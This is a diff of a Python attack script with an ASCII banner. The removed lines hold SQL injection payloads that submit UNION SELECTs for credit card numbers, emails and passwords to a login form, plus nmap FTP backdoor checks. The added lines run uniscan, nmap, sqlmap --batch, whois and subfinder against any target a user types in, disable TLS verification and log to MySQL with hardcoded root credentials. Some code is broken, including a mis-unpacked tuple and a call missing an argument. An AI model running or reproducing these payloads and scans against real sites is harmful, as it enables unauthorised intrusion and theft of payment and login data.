@@ -68,102 +68,129 @@ def print_header():
  ;         ';:';  ;         ';:;        ,'´          '`:;::`,              /;:· '´ ¯¯  `' ·-:::/'            /;:· '´ ¯¯  `' ·-:::/'            ,'´          '`:;::`,        '\                       '`;::'i‘  
  |         'i::i  i         'i:';°      /                `;::\           /.'´      _         '`;/' ‘         /.'´      _         ';/' ‘          /                `;::\         i       i':/:::';       ,:'           `;:::';       ,:'           `;:::';         i       i':/:::';    
  'i        i':/_/:';        ;:';°   i'       ,';´'`;         '\:::', ‘  /     /':::::/;::::_::::::::;‘    /     /':::::/;::::_::::::::;‘     i'       ,';´'`;         '\:::', ‘     i       i/:·'´       ,:''      
-  ;       i·´   '`·;       ;:/°  ,'        ;' /´:`';         ';:::'i‘,'     ;':::::'/·´¯     ¯'`·;:::¦‘ ,'     ;':::::'/·´¯`·;:::¦‘`;  ,'`;      ,'        ;' /´:`';         ';:::'i‘     '; '    ,:,     ~;'´:::'`:,   
-  ';    ';/ '`'*'´  ';    ';/' '‘  'i        '´        `'         'i::'/ ;      '`·:;:::::`'*;:'´      |/'   ;      '`·:;:::::`'*;:'´      |/'  'i        '´        `'         'i::'/      ;     ;/   \       '`:/::::/'
-    \   /          '\   '/'      ¦       '/`' *^~-·'´\         ';'/'‚  \          '`*^*'´         /'  ‘   \          '`*^*'´         /'  ‘ ¦       '/`' *^~-·'´\         ';'/'‚      ';   ,'       \         '`;/ 
-     '`'´             `''´   '    '`., .·´              `·.,_,.·´  ‚    `·.,               ,.-·´          `·.,               ,.-·´      '`., .·´              `·.,_,.·´  ‚       `'*´          '`~·-·^'´    
-                      '                                                    '`*^~·~^*'´                     '`*^~·~^*'´                                                                                
-    """
-    for i in range(len(colors)):
-        sys.stdout.write("\r" + colors[i] + header)
-        sys.stdout.flush()
-        time.sleep(0.5)
-    print("\033[0m")  # Reset color to default
+  ;       i·´   '`·;       ;:/°  ,'        ;' /´:`';         ';:::'i‘,'     ;':::::'/·´¯     ¯'`·;:::¦‘ ,'     ;':::::'/·´¯`·;:::¦‘`;  ,'`;      ,'        `,'        ;
+                                                                      
+"""
 
-def check_website_status(url):
-    """Check if the website is accessible."""
+    for color in colors:
+        clear_screen()
+        print(color + header + '\033[0m')
+        time.sleep(0.2)
+
+def get_ip_info(ip):
+    """Get IP information using an external service."""
     try:
-        response = requests.get(url)
-        if response.status_code == 200:
-            print(f"The website {url} is accessible.")
-            return True
-        else:
-            print(f"The website {url} is not accessible. Status code: {response.status_code}")
-            return False
-    except requests.RequestException as e:
-        print(f"An error occurred: {e}")
-        return False
+        response = requests.get(f"https://ipinfo.io/{ip}/json", verify=False)
+        response.raise_for_status()
+        return response.json()
+    except (RequestException, SSLError) as e:
+        return str(e)
 
-def perform_sql_injection(target_url, results_dir):
-    """Perform SQL Injection using the provided payloads."""
-    global file_count  # Declare file_count as global
-    payloads = [
-        "' OR 1=1 UNION SELECT cc_number, cc_holder, cc_expiration FROM credit_cards --",
-        "' OR 1=1 UNION SELECT email FROM users --",
-        "' OR 1=1 UNION SELECT password FROM users --",
-        "' OR 1=1 UNION SELECT contact_name, contact_number FROM contacts --",
-        "SELECT * FROM users WHERE username='admin';",
-        "INSERT INTO users (username, password) VALUES ('newuser', 'newpassword');",
-        "UPDATE users SET password='newpassword' WHERE username='admin';",
-        "DELETE FROM users WHERE username='olduser';",
-        "SELECT * FROM products WHERE name LIKE '%user_input%';",
-        "SELECT * FROM products WHERE name LIKE '%admin%' UNION SELECT username, password FROM users;",
-        "SELECT * FROM users WHERE username='user_input' AND password='password_input';",
-        "SELECT * FROM users WHERE username='admin' AND password=' OR 1=1 -- ';",
-        "SELECT * FROM products WHERE name LIKE '%...WHERE name LIKE '%user_input%';",
-        "SELECT * FROM products WHERE name LIKE '%admin%' AND (SELECT COUNT(*) FROM users WHERE username='admin')=1;",
-        "SELECT * FROM products WHERE name LIKE '%user_input%';",
-        "SELECT * FROM products WHERE name LIKE '%admin%' AND SLEEP(5);"
-    ]
-    
-    file_count = 1  # Initialize file_count for this function
-    
-    for payload in payloads:
-        data = {
-            'username': f'admin{payload}',
-            'password': 'password'  # Update with the correct password field if needed
-        }
+def scan_with_uniscan(target):
+    """Run Uniscan on the target."""
+    command = ["uniscan", "-u", target, "-qweds"]
+    stdout, stderr = run_command(command)
+    save_to_file("uniscan_results.txt", stdout)
+    if stderr:
+        save_to_file("uniscan_errors.txt", stderr)
+    return stdout, stderr
 
-        try:
-            response = requests.post(target_url, data=data, verify=False)  # Disabling SSL verification
-            output_file = os.path.join(results_dir, f'sql_injection_{file_count}.txt')
-            with open(output_file, 'w') as file:
-                file.write(response.text)
-            print(f"Saved SQL Injection results to {output_file}")
-            file_count += 1
-        except Exception as e:
-            print(f"An error occurred during SQL Injection attempt: {e}")
+def scan_with_nmap(target):
+    """Run Nmap on the target."""
+    command = ["nmap", "-sV", target]
+    stdout, stderr = run_command(command)
+    save_to_file("nmap_results.txt", stdout)
+    if stderr:
+        save_to_file("nmap_errors.txt", stderr)
+    return stdout, stderr
 
-def perform_ftp_scan(target_url, results_dir):
-    """Perform an FTP scan on the target URL."""
-    global file_count  # Declare file_count as global
-    command = ["nmap", "-p", "21", "--script", "ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221", target_url]
-    
+def scan_with_sqlmap(target):
+    """Run SQLMap on the target."""
+    command = ["sqlmap", "-u", target, "--batch"]
+    stdout, stderr = run_command(command)
+    save_to_file("sqlmap_results.txt", stdout)
+    if stderr:
+        save_to_file("sqlmap_errors.txt", stderr)
+    return stdout, stderr
+
+def run_whois(domain):
+    """Run Whois on the domain."""
+    command = ["whois", domain]
+    stdout, stderr = run_command(command)
+    save_to_file("whois_results.txt", stdout)
+    if stderr:
+        save_to_file("whois_errors.txt", stderr)
+    return stdout, stderr
+
+def run_subfinder(domain):
+    """Run Subfinder on the domain."""
+    command = ["subfinder", "-d", domain]
+    stdout, stderr = run_command(command)
+    save_to_file("subfinder_results.txt", stdout)
+    if stderr:
+        save_to_file("subfinder_errors.txt", stderr)
+    return stdout, stderr
+
+def log_to_database(host, user, password, db, data):
+    """Log data to a MySQL database."""
     try:
-        stdout,stdout, stderr = run_command(command)
-        output_file = os.path.join(results_dir, f'ftp_scan_{file_count}.txt')
-        with open(output_file, 'w') as file:
-            file.write(stdout)
-        print(f"Saved FTP scan results to {output_file}")
-        file_count += 1
-    except Exception as e:
-        print(f"An error occurred during FTP scan: {e}")
+        connection = pymysql.connect(host=host, user=user, password=password, database=db)
+        cursor = connection.cursor()
+        sql = "INSERT INTO scan_results (scan_data, timestamp) VALUES (%s, %s)"
+        cursor.execute(sql, (data, datetime.now()))
+        connection.commit()
+        cursor.close()
+        connection.close()
+    except pymysql.MySQLError as e:
+        print(f"Error logging to database: {e}")
 
 def main():
-    target_url = "http://example.com"  # Replace with the target URL
-    results_dir = "results"  # Replace with the desired results directory
-
-    if not os.path.exists(results_dir):
-        os.makedirs(results_dir)
-
-    print_header()
+    """Main function to orchestrate the scans."""
     clear_screen()
-
-    if check_website_status(target_url):
-        perform_sql_injection(target_url, results_dir)
-        perform_ftp_scan(target_url, results_dir)
-    else:
-        print("The website is not accessible. Exiting.")
+    print_header()
+    
+    install_tools()
+    
+    target = input("Enter the target IP or domain: ")
+    print(f"Target: {target}")
+    
+    print("\n[1] Running Uniscan...")
+    uniscan_stdout, uniscan_stderr = scan_with_uniscan(target)
+    print(uniscan_stdout)
+    
+    print("\n[2] Running Nmap...")
+    nmap_stdout, nmap_stderr = scan_with_nmap(target)
+    print(nmap_stdout)
+    
+    print("\n[3] Running SQLMap...")
+    sqlmap_stdout, sqlmap_stderr = scan_with_sqlmap(target)
+    print(sqlmap_stdout)
+    
+    print("\n[4] Running Whois...")
+    whois_stdout, whois_stderr = run_whois(target)
+    print(whois_stdout)
+    
+    print("\n[5] Running Subfinder...")
+    subfinder_stdout, subfinder_stderr = run_subfinder(target)
+    print(subfinder_stdout)
+    
+    print("\n[6] Getting IP information...")
+    ip_info = get_ip_info(target)
+    print(ip_info)
+    
+    # Log results to the database (example usage)
+    db_host = "localhost"
+    db_user = "root"
+    db_password = "password"
+    db_name = "scan_results_db"
+    
+    log_to_database(db_host, db_user, db_password, db_name, uniscan_stdout)
+    log_to_database(db_host, db_user, db_password, db_name, nmap_stdout)
+    log_to_database(db_host, db_user, db_password, db_name, sqlmap_stdout)
+    log_to_database(db_host, db_user, db_password, db_name, whois_stdout)
+    log_to_database(db_host, db_user, db_password, db_name, subfinder_stdout)
+    log_to_database(db_host, db_user, db_password, db_name) 
+    log_to_database(db_host, db_user, db_password, db_name, str(ip_info))
 
 if __name__ == "__main__":
     main()
